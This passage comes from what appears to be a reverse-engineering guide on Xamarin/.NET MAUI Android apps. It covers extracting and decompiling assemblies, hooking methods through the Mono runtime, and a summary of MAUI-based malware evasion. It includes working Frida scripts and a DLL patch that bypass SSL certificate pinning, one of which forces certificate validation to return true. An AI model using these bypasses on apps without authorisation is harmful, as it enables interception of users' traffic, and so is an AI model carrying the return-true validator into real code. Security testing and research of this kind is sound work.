extraction must be done manually before feeding the payload to pyxamstore. Automated tooling for the full MAUI 9 pipeline is still maturing.</p>"},{"location":"reversing/frameworks/xamarin/#bundle-format-libmonodroid_bundle_appso","title":"Bundle Format (libmonodroid_bundle_app.so)","text":"<p>Some Xamarin apps use the \"bundle\" format, embedding all assemblies into <code>libmonodroid_bundle_app.so</code>. Use mono_unbundle to extract:</p> <pre><code>python3 mono_unbundle.py lib/arm64-v8a/libmonodroid_bundle_app.so output_dir/\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#analysis-tools-workflow","title":"Analysis Tools &amp; Workflow","text":"Tool Purpose Platform dnSpy .NET decompiler + debugger, edit and recompile IL Windows ILSpy .NET decompiler (read-only, cross-platform via CLI) Windows, macOS, Linux dotPeek JetBrains .NET decompiler Windows pyxamstore Unpack <code>assemblies.blob</code> stores Python XamAsmUnZ Decompress XALZ-compressed assemblies Python mono_unbundle Extract DLLs from <code>libmonodroid_bundle_app.so</code> Python Fridax Frida wrapper for Mono JIT/AOT method hooking Node.js frida-xamarin-unpin Xamarin SSL pinning bypass Frida Frida Runtime instrumentation Cross-platform jadx DEX decompilation (Java bootstrap only) Cross-platform"},{"location":"reversing/frameworks/xamarin/#recommended-workflow","title":"Recommended Workflow","text":"<ol> <li>Identify format -- check for loose DLLs, <code>assemblies.blob</code>, or <code>libassemblies.*.blob.so</code></li> <li>Extract assemblies -- use the appropriate extraction method for the format</li> <li>Decompress -- handle XALZ/LZ4 compression if present</li> <li>Decompile -- open DLLs in dnSpy or ILSpy</li> <li>Analyze C# source -- search for API endpoints, encryption, credential handling</li> <li>Patch if needed -- dnSpy allows editing and recompiling IL directly</li> <li>Repackage -- compress, repack into blob/APK, re-sign</li> </ol>"},{"location":"reversing/frameworks/xamarin/#decompilation-quality","title":"Decompilation Quality","text":"<p>.NET IL decompiles to near-perfect C# source code. Variable names, string literals, class hierarchies, and control flow are all preserved. This makes Xamarin/.NET MAUI apps among the easiest to reverse engineer -- the C# output is often more readable than the original source due to compiler normalizations.</p> <pre><code>public async Task&lt;LoginResponse&gt; Authenticate(string username, string password)\n{\n    var client = new HttpClient();\n    var payload = new { user = username, pass = password };\n    var json = JsonConvert.SerializeObject(payload);\n    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n    var response = await client.PostAsync(\"https://api.example.com/auth\", content);\n    return JsonConvert.DeserializeObject&lt;LoginResponse&gt;(await response.Content.ReadAsStringAsync());\n}\n</code></pre> <p>The above is representative of what dnSpy produces from a Xamarin DLL -- structurally identical to the original source.</p>"},{"location":"reversing/frameworks/xamarin/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":""},{"location":"reversing/frameworks/xamarin/#frida-mono-runtime-hook","title":"Frida Mono Runtime Hook","text":"<p>The most common pinning mechanism in Xamarin is <code>ServicePointManager.ServerCertificateValidationCallback</code>. On Mono, this is a static delegate that can be overridden at runtime.</p> <p>frida-xamarin-unpin handles this automatically:</p> <pre><code>frida -U -f com.target.app -l frida-xamarin-unpin.js --no-pause\n</code></pre> <p>The script hooks the Mono runtime to intercept the certificate validation callback and force it to return <code>true</code>.</p>"},{"location":"reversing/frameworks/xamarin/#manual-mono-hook","title":"Manual Mono Hook","text":"<p>For custom pinning implementations, hook the Mono runtime's JIT compilation to intercept specific C# methods:</p> <pre><code>var mono = Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_jit_runtime_invoke\");\nInterceptor.attach(mono, {\n    onEnter: function(args) {\n        var methodName = Memory.readUtf8String(\n            Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_method_get_name\")(args[0])\n        );\n        if (methodName &amp;&amp; methodName.indexOf(\"ValidateCertificate\") !== -1) {\n            this.shouldPatch = true;\n        }\n    },\n    onLeave: function(retval) {\n        if (this.shouldPatch) {\n            console.log(\"[Xamarin] Certificate validation bypassed\");\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#dll-patching-permanent-bypass","title":"DLL Patching (Permanent Bypass)","text":"<p>The most reliable approach: patch the certificate validation directly in the DLL.</p> <ol> <li>Extract the target DLL (e.g., <code>MyApp.dll</code>)</li> <li>Open in dnSpy</li> <li>Locate the certificate validation method (search for <code>ServerCertificateValidationCallback</code>, <code>ServicePointManager</code>, or <code>X509Certificate</code>)</li> <li>Replace the validation body to return <code>true</code>:</li> </ol> <pre><code>public bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)\n{\n    return true;\n}\n</code></pre> <ol> <li>Save the modified DLL in dnSpy (File &gt; Save Module)</li> <li>Repackage the DLL into the APK (compress with LZ4 if the original was compressed)</li> <li>Re-sign and install</li> </ol> <p>This approach is permanent and avoids runtime hooking entirely.</p>"},{"location":"reversing/frameworks/xamarin/#java-layer-fallback","title":"Java-Layer Fallback","text":"<p>Some Xamarin apps use the <code>AndroidClientHandler</code> instead of the Mono HTTP stack, which delegates to Android's native <code>HttpURLConnection</code>. In this case, standard Java-layer hooks work:</p> <pre><code>Java.perform(function() {\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        return untrustedChain;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/xamarin/#fridax-mono-method-interception","title":"Fridax (Mono Method Interception)","text":"<p>Fridax provides a high-level interface for hooking .NET methods at the Mono runtime level:</p> <pre><code>npm install\nnpm run fridax\n</code></pre> <p>Fridax supports both JIT and AOT compiled methods. For JIT targets, it forces JIT compilation of the target method using <code>mono_compile_method()</code>, then hooks the resulting native code.</p>"},{"location":"reversing/frameworks/xamarin/#direct-mono-api-hooking","title":"Direct Mono API Hooking","text":"<p>Hook arbitrary C# methods by resolving them through the Mono embedding API:</p> <pre><code>var monoModule = Process.findModuleByName(\"libmonosgen-2.0.so\");\n\nvar mono_get_root_domain = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_get_root_domain\"),\n    \"pointer\", []\n);\n\nvar mono_assembly_foreach = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_assembly_foreach\"),\n    \"void\", [\"pointer\", \"pointer\"]\n);\n\nvar mono_class_get_method_from_name = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_class_get_method_from_name\"),\n    \"pointer\", [\"pointer\", \"pointer\", \"int\"]\n);\n\nvar mono_compile_method = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_compile_method\"),\n    \"pointer\", [\"pointer\"]\n);\n</code></pre> <p>After resolving the target method, force JIT compilation to get a native address, then use <code>Interceptor.attach</code>:</p> <pre><code>var methodPtr = mono_class_get_method_from_name(targetClass, Memory.allocUtf8String(\"Authenticate\"), 2);\nvar nativeCode = mono_compile_method(methodPtr);\n\nInterceptor.attach(nativeCode, {\n    onEnter: function(args) {\n        console.log(\"[Mono] Authenticate called\");\n    },\n    onLeave: function(retval) {\n        console.log(\"[Mono] Authenticate returned\");\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#java-bridge-interception","title":"Java Bridge Interception","text":"<p>The Mono-Android bridge passes through JNI. Hook the Java side to intercept Mono-to-Android calls:</p> <pre><code>Java.perform(function() {\n    var MonoRuntimeProvider = Java.use(\"mono.MonoRuntimeProvider\");\n    console.log(\"[Xamarin] MonoRuntimeProvider loaded\");\n\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            if (className.indexOf(\"mono.\") === 0) {\n                console.log(\"[Mono Bridge] \" + className);\n            }\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#enumerating-loaded-assemblies","title":"Enumerating Loaded Assemblies","text":"<p>List all .NET assemblies loaded in the Mono runtime:</p> <pre><code>var mono_assembly_foreach = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_assembly_foreach\"),\n    \"void\", [\"pointer\", \"pointer\"]\n);\n\nvar mono_assembly_get_name = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_assembly_get_name\"),\n    \"pointer\", [\"pointer\"]\n);\n\nvar mono_assembly_name_get_name = new NativeFunction(\n    Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_assembly_name_get_name\"),\n    \"pointer\", [\"pointer\"]\n);\n\nvar callback = new NativeCallback(function(assembly, userData) {\n    var aname = mono_assembly_get_name(assembly);\n    var name = Memory.readUtf8String(mono_assembly_name_get_name(aname));\n    console.log(\"[Assembly] \" + name);\n}, \"void\", [\"pointer\", \"pointer\"]);\n\nmono_assembly_foreach(callback, ptr(0));\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#obfuscation-anti-analysis","title":"Obfuscation &amp; Anti-Analysis","text":""},{"location":"reversing/frameworks/xamarin/#default-state","title":"Default State","text":"<p>Out of the box, Xamarin/.NET MAUI assemblies contain full type names, method names, string literals, and IL bytecode. Without additional protection, decompilation produces near-source C#.</p>"},{"location":"reversing/frameworks/xamarin/#net-obfuscators","title":".NET Obfuscators","text":"Tool Techniques Dotfuscator Renaming, string encryption, control flow obfuscation, tamper detection Babel Obfuscator IL-level flow obfuscation, string encryption, metadata stripping ConfuserEx Open-source: anti-debug, anti-dump, control flow, constant encryption ArmDot .NET MAUI support, method-level virtualization, code encryption R8/ProGuard Java/Kotlin layer only -- does not affect .NET assemblies <p>Even with obfuscation, .NET IL retains enough structure for tools like de4dot to automatically deobfuscate many transformations.</p>"},{"location":"reversing/frameworks/xamarin/#aot-compilation-as-protection","title":"AOT Compilation as Protection","text":"<p>When AOT mode is used, assemblies are pre-compiled to native code (<code>*.dll.so</code> files). The original IL may be stripped, making decompilation impossible. However, AOT is uncommon in practice due to increased APK size and build complexity.</p>"},{"location":"reversing/frameworks/xamarin/#net-maui-blob-evasion","title":".NET MAUI Blob Evasion","text":"<p>The shift from loose DLLs to blob storage and ELF-embedded payloads is not obfuscation per se, but it evades security tools that only scan DEX files. Since the C# code lives in binary blob files that standard Android scanners do not inspect, malware using .NET MAUI can pass automated scanning that would flag equivalent Java/Kotlin code.</p>"},{"location":"reversing/frameworks/xamarin/#malware-context","title":"Malware Context","text":""},{"location":"reversing/frameworks/xamarin/#mcafee-xamalicious-backdoor","title":"McAfee Xamalicious Backdoor","text":"<p>In late 2023, McAfee discovered Xamalicious, a backdoor built with Xamarin that had been active since mid-2020. Found in 25 Google Play apps with 327,000+ downloads, Xamalicious exploited the Xamarin build process itself as a packing mechanism. The malicious code was hidden in C# assemblies that standard Android scanners never inspect. After gaining accessibility service access, Xamalicious dynamically injected a second-stage assembly DLL from its C2 server for ad fraud. McAfee linked the operation to the Cash Magnet ad-fraud app, revealing the commercial motivation behind the technical investment in framework abuse.</p>"},{"location":"reversing/frameworks/xamarin/#mcafee-net-maui-malware-report","title":"McAfee .NET MAUI Malware Report","text":"<p>In March 2025, McAfee documented Android malware campaigns using .NET MAUI to evade detection. The campaigns exploited the fundamental gap in Android security tooling: most scanners analyze DEX files for suspicious code patterns, but .NET MAUI stores all application logic in C# binary blobs that these scanners ignore.</p> <p>Key findings from the McAfee report:</p> Technique Details Blob-based evasion All malicious logic in C# DLLs inside binary blob files, invisible to DEX scanners Multi-stage decryption Stage 1: XOR-decrypt a loader. Stage 2: AES-decrypt the .NET MAUI payload. Stage 3: execute C# malware Manifest bloating <code>AndroidManifest.xml</code> padded with randomly generated strings to confuse static analysis TCP C2 communication Raw TCP sockets instead of HTTP, avoiding standard network traffic signatures Target apps Fake banking, social media (X/Twitter clone), dating, and communication apps Target regions India and China <p>Detection Gap</p> <p>The McAfee report highlights that contemporary Android security tools are designed to scan DEX files for suspicious logic. .NET MAUI's architecture stores code in binary blobs that are not inspected. This is a systemic blind spot, not a bug in specific tools. Any malware using .NET MAUI benefits from this evasion automatically.</p>"},{"location":"reversing/frameworks/xamarin/#broader-net-maui-malware-patterns","title":"Broader .NET MAUI Malware Patterns","text":"Campaign Type Technique Fake banking apps Clone banking UI in C#/XAML, harvest credentials, forward to C2 Data theft Collect contacts, SMS, photos from Mono APIs, exfiltrate via TCP Credential harvesting Display phishing forms, POST data to attacker server"},{"location":"reversing/frameworks/xamarin/#why-net-maui-appeals-to-malware-authors","title":"Why .NET MAUI Appeals to Malware Authors","text":"<ul> <li>DEX-blind scanners -- all logic in .NET blobs, not in Dalvik bytecode</li> <li>Multi-layer encryption -- XOR + AES staging adds layers before the C# payload executes</li> <li>Cross-platform -- C# codebase targets Android and iOS</li> <li>Rapid development -- C#/XAML is a productive development environment with strong tooling</li> <li>Ironically easy to RE -- once assemblies are extracted, decompilation is trivial, but automated scanners never get that far</li> </ul>"},{"location":"reversing/frameworks/xamarin/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Mono (JIT) AOT .NET MAUI 9 Assembly extraction Easy (loose DLLs or pyxamstore) DLLs present but code pre-compiled Moderate (ELF section extraction) Decompilation quality Near-perfect C# Limited (native code) Near-perfect C# (after extraction) String recovery Full Partial Full Hooking High (Mono API, Fridax) Moderate (native hooks) High (same Mono API) Patching Easy (dnSpy edit + recompile) Difficult Easy (after extraction) Overall difficulty Easy (rank 7/28) Moderate Easy-Moderate (rank 7/28 once extracted) <p>The core RE challenge with Xamarin/.NET MAUI is extraction, not analysis. Once DLLs are in hand, decompilation produces high-fidelity C# source. The difficulty comes from identifying the correct packaging format and applying the right extraction tool. For .NET MAUI 9's ELF-embedded format, the additional <code>llvm-objcopy</code> step and potential XALZ decompression add friction but do not fundamentally change the analysis outcome.</p>"},{"location":"reversing/frameworks/xamarin/#references","title":"References","text":"<ul> <li>McAfee: New Android Malware Campaigns Using .NET MAUI</li> <li>pyxamstore -- Xamarin AssemblyStore Parser</li> <li>Unpacking Xamarin AssemblyStore Blobs -- The Cobra Den</li> <li>Fridax -- Frida for Xamarin</li> <li>frida-xamarin-unpin -- GoSecure</li> <li>Bypassing Xamarin Certificate Pinning -- GoSecure</li> <li>mono_unbundle -- Extract DLLs from Bundle</li> <li>Decompiling .NET MAUI 9 Android Applications -- Walkowski</li> <li>Appknox: Xamarin Reverse Engineering Guide</li> <li>dnSpy -- .NET Debugger and Decompiler</li> <li>ILSpy -- .NET Decompiler</li> <li>HackTricks: Xamarin Apps</li> </ul>"}]}